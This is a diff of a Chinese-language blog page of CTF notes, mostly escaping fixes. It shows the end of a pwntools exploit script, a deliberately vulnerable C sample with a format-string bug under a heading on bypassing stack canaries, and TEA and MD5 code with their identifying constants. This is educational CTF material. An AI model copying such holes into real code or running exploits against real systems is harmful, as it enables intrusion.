 <span class="token punctuation">}</span></code></pre>
@@ -1462,8 +1541,8 @@ sh<span class="token punctuation">.</span>recvuntil<span class="token punctuatio
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <h3 id="溢出覆盖绕过Canary保护"><a href="#溢出覆盖绕过Canary保护" class="headerlink" title="溢出覆盖绕过Canary保护"></a>溢出覆盖绕过Canary保护</h3><p>先给出样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 
 <span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -1480,7 +1559,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
@@ -2115,7 +2194,9 @@ int main(void)
 {
     int i=0;
     EnBase64();
-    cout<<ans; } < code></ans;></iostream></code></pre><code class="language-C">
+    cout<<ans;
+
+} </code></pre>
 <h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
 <p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
 <pre class=" language-C"><code class="language-C">#include <stdint.h>
@@ -2142,7 +2223,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
         sum -= delta;                                   
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
-}</stdint.h></code></pre>
+}</code></pre>
 <p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
 <h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
 <p>这里给出MD5实现的伪代码</p>
@@ -2208,7 +2289,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
     h3 := h3 + d
     End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</code></pre>
 <p>MD5算法的显著特征就是 ==存在4个变量 h0=0x67452301 h1=0xefcdab89 h2=0x98badcfe h3=0x10325476==</p>
-</code><script>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
